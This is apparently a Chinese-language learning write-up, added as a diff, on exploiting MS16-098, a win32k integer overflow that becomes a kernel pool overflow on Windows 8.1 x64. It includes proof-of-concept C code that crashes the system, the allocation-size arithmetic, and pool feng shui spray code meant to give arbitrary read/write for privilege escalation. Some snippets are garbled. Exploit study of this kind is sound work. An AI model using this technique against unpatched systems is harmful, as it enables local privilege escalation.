@@ -1,0 +1,169 @@
+# Introduction
+初步接触 windows 内核漏洞利用，我的想法是找一个带有分析的可利用的漏洞来学习，正好找到了MS16-098。
+参考的文章：
+  * [Exploiting MS16-098 RGNOBJ Integer Overflow on Windows 8.1 x64 bit by abusing GDI objects](https://sensepost.com/blog/2017/exploiting-ms16-098-rgnobj-integer-overflow-on-windows-8.1-x64-bit-by-abusing-gdi-objects/)
+  * [Windows 10下MS16-098 RGNOBJ整数溢出漏洞分析及利用](http://repwn.com/archives/26/)
+这个洞是由整数溢出漏洞导致的池溢出 (pool overflow) 继而使用 GDI objects 技术获取到 system token
+完成权限提升，其中池风水和使用 GDI objects 获得任意地址读写的技术是学习的重点。
+开始之前我们需要做一些准备：
+  * windows 8.1 x64 & vmware
+  * Virtual KD  用于辅助对虚拟机系统进行内核调试
+  * windbg
+# Analysing the Patch and bug
+从 [Security Bulletin MS16-098](https://docs.microsoft.com/en-us/security-updates/securitybulletins/2016/ms16-098) 页面下载  
+对应的[补丁安装程序](https://www.microsoft.com/en-us/download/details.aspx?id=53491)，用
+`expand` 命令提取其中的文件：
+    expand -F:* windows8.1-kb3177725-x64 .
+    expand -F:* Windows8.1-KB3177725-x64.cab .
+这样获取到了 patch 之后的 win32k.sys 文件，我们用 ida 对旧版和 patch 版的 win32k.sys 进行分析。
+根据文章中的信息，漏洞存在于 `win32k!bFill` 函数中，
+如图中的代码， 当 eax 的值大于14则跳转执行
+    lea     ecx, [rax+rax*2]
+    shl     ecx, 4
+这就相当于
+    if (eax > 14) {
+        size = (eax * 3) (struct EPATHOBJ *@, struct _RECTL *@, unsigned int@, void (__stdcall *)(struct _RECTL *, unsigned int, void *)@, void *)
+用如下 poc 代码可以触发 `bFill` 函数：
+    #include 
+    #include 
+    #include 
+    #include 
+    #include 
+    #include 
+    #include 
+    void main(int argc, char* argv[]) {
+        //Create a Point array
+        static POINT points[0x10001];
+        // Get Device context of desktop hwnd
+        HDC hdc = GetDC(NULL);
+        // Get a compatible Device Context to assign Bitmap to
+        HDC hMemDC = CreateCompatibleDC(hdc);
+        // Create Bitmap Object
+        HGDIOBJ bitmap = CreateBitmap(0x5a, 0x1f, 1, 32, NULL);
+        // Select the Bitmap into the Compatible DC
+        HGDIOBJ bitobj = (HGDIOBJ)SelectObject(hMemDC, bitmap);
+        //Begin path
+        BeginPath(hMemDC);
+        PolylineTo(hMemDC, points, 0x10001);
+        // End the path
+        EndPath(hMemDC);
+        // Fill the path
+        FillPath(hMemDC);
+    }
+这里注意对 win32k.sys 要下硬件断点，到达断点后查看栈回溯
+那么可以知道到达 `bFill` 函数的调用链为
+    EngFastFill() -> bPaintPath() -> bEngFastFillEnum() -> Bfill()
+在 `EngFastFill` 中还有一个分支语句分别会调用 `bPaintPath`、`bBrushPath` 或者 `bBrushPathN_8x8`，  
+这取决于 brush 对象是否和 hdc 有关联。在这之前还会检查一下 hdc 设备上下文的类型，总共有四种类型：
+  * Printer
+  * Display (默认情况下的类型)
+  * Information
+  * Memory (这种类型支持在 bitmap 对象上进行画图操作)
+# Controlling the Allocation Size
+在之前对 patch 进行对比分析的时候我们已经知道了漏洞产生的具体情况了，主要是这步操作 `lea ecx, [rax+rax*2]`，  
+它的操作数为32位，然后是对操作数乘以3，而 ecx 寄存器所能存储的最大值为 0xffffffff，那么在不发生溢出的情况下，  
+我们所能输入的极限就是：
+    0xffffffff / 3 = 0x55555555
+只要输入大于这个值，就会触发整数溢出：
+    0x55555556 * 3 = 0x100000002
+再加上左移4位，相当于除以0x10，那么我们理想的输入就是：
+(0x5555556 * 3) = 0x10000002
+0x10000002 << 4 = 0x20 (32bit register value)
+现在修改我们的代码，调整 PATH 对象中 points 结构的数量，如下代码会触发分配 0x50 字节大小的空间：
+    void main(int argc, char* argv[]) {
+        //Create a Point array 
+        static POINT points[0x3fe01];
+        points[0].x = 1;
+        points[0].y = 1;
+        // Get Device context of desktop hwnd
+        HDC hdc = GetDC(NULL);
+        // Get a compatible Device Context to assign Bitmap to
+        HDC hMemDC = CreateCompatibleDC(hdc);
+        // Create Bitmap Object
+        HGDIOBJ bitmap = CreateBitmap(0x5a, 0x1f, 1, 32, NULL);
+        // Select the Bitmap into the Compatible DC
+        HGDIOBJ bitobj = (HGDIOBJ)SelectObject(hMemDC, bitmap);
+        //Begin path
+        BeginPath(hMemDC);
+        // Calling PolylineTo 0x156 times with PolylineTo points of size 0x3fe01.
+        for (int j = 0; j < 0x156; j++) {
+            PolylineTo(hMemDC, points, 0x3FE01);
+        }
+        // End the path
+        EndPath(hMemDC);
+        // Fill the path
+        FillPath(hMemDC);
+    }
+为什么是 0x50 字节呢？我们来算一下：
+循环调用 `PolylineTo` 函数 0x156 次的情况下 points 的数量为
+0x3fe01 * 0x156 = 0x5555556
+但是在调试过程中发现程序会额外添加一个，所以计算时操作数的的值为 0x5555557，结果则是
+0x5555557 * 3 = 0x10000005
+0x10000005 << 4 = 0x50 (32bit)
+那么程序为 points 对象分配的空间大小为 0x50 字节，却可以复制 0x5555557 个 points 对象到分配的空间，  
+果然在运行 poc 代码后，系统出现了 BSOD！
+# Kernel Pool Feng Shui
+接下来进入到比较难也很关键的步骤：内核池风水
+池风水是一项用来确定内存布局的技术，在分配目标对象之前，先在内存中分配和释放一些内存，空出来一些空间，  
+让目标对象在下一次分配时被分配到指定的位置。现在的思路是通过池风水让目标对象于受控制对象相邻，  
+然后通过溢出覆盖到目标对象，更改关键数据结构获得任意地址读写。这也是开头提到的 Gdi objects，  
+这里选用 bitmap 对象，它的池标记为 Gh05，池类型为 Paged Session Pool，  
+可以用 SetBitmapBits/GetBitmapBits 函数读/写任意地址，具体可以参考  
+CoreLabs 的文章 [Abusing GDI for ring0 exploit
+primitives](https://sensepost.com/blog/2017/exploiting-ms16-098-rgnobj-integer-overflow-on-windows-8.1-x64-bit-by-abusing-gdi-objects/)  
+还有 KeenTeam 的 [This Time Font hunt you down in 4
+bytes](http://www.slideshare.net/PeterHlavaty/windows-kernel-exploitation-this-time-font-hunt-you-down-in-4-bytes)
+而 crash 的具体原因是 bFill 函数结束时分配的对象被释放掉，对象释放时会检查相邻对象的 pool header，但是溢出会把它破坏掉，  
+从而触发异常 BAD_POOL_HEADER 然后就 BSOD 了。
+有一个办法可以防止检查时触发异常，那就是让目标对象分配在内存页的末尾。这样在对象被释放时就不会有 next chunk  
+从而正常释放。 要完成这样的池风水需要知道以下几个关键点：
+  * 内核池每页大小为 0x1000 字节，比这个还要大的分配请求会被分配到更大的内核池
+  * 任何请求大小超过 0x808 字节会被分配到内存页的起始处
+  * 连续的请求会从页的末尾分配
+  * 分配的对象通常会加上 0x10 字节大小的 pool header，比如请求 0x50 字节的内存，实际包含了 pool header 会分配 0x60 字节大小的内存。
+现在我们来看看怎样完成内核池风水，以及它的运作原理，看一下如下利用代码：
+    void fungshuei() {
+        HBITMAP bmp;
+        // Allocating 5000 Bitmaps of size 0xf80 leaving 0x80 space at end of page.
+        for (int k = 0; k < 5000; k++) {
+            bmp = CreateBitmap(1670, 2, 1, 8, NULL); // 1670  = 0xf80 1685 = 0xf90 allocation size 0xfa0
+            bitmaps[k] = bmp;
+        }
+        HACCEL hAccel, hAccel2;
+        LPACCEL lpAccel;
+        // Initial setup for pool fengshui.  
+        lpAccel = (LPACCEL)malloc(sizeof(ACCEL));
+        SecureZeroMemory(lpAccel, sizeof(ACCEL));
+        // Allocating  7000 accelerator tables of size 0x40 0x40 *2 = 0x80 filling in the space at end of page.
+        HACCEL *pAccels = (HACCEL *)malloc(sizeof(HACCEL) * 7000);
+        HACCEL *pAccels2 = (HACCEL *)malloc(sizeof(HACCEL) * 7000);
+        for (INT i = 0; i < 7000; i++) {
+            hAccel = CreateAcceleratorTableA(lpAccel, 1);
+            hAccel2 = CreateAcceleratorTableW(lpAccel, 1);
+            pAccels[i] = hAccel;
+            pAccels2[i] = hAccel2;
+        }
+        // Delete the allocated bitmaps to free space at beginning of pages
+        for (int k = 0; k < 5000; k++) {
+            DeleteObject(bitmaps[k]);
+        }
+        //allocate Gh04 5000 region objects of size 0xbc0 which will reuse the free-ed bitmaps memory.
+        for (int k = 0; k < 5000; k++) {
+            CreateEllipticRgn(0x79, 0x79, 1, 1); //size = 0xbc0
+        }
+        // Allocate Gh05 5000 bitmaps which would be adjacent to the Gh04 objects previously allocated
+        for (int k = 0; k < 5000; k++) {
+            bmp = CreateBitmap(0x52, 1, 1, 32, NULL); //size  = 3c0
+            bitmaps[k] = bmp;
+        }
+        // Allocate 1700 clipboard objects of size 0x60 to fill any free memory locations of size 0x60
+        for (int k = 0; k < 1700; k++) { //1500
+            AllocateClipBoard2(0x30);
+        }
+        // delete 2000 of the allocated accelerator tables to make holes at the end of the page in our spray.
+        for (int k = 2000; k < 4000; k++) {
+            DestroyAcceleratorTable(pAccels[k]);
+            DestroyAcceleratorTable(pAccels2[k]);
+        }
+    }x3222222222222222
+要清楚的看到分配/释放的流程，一图胜千言
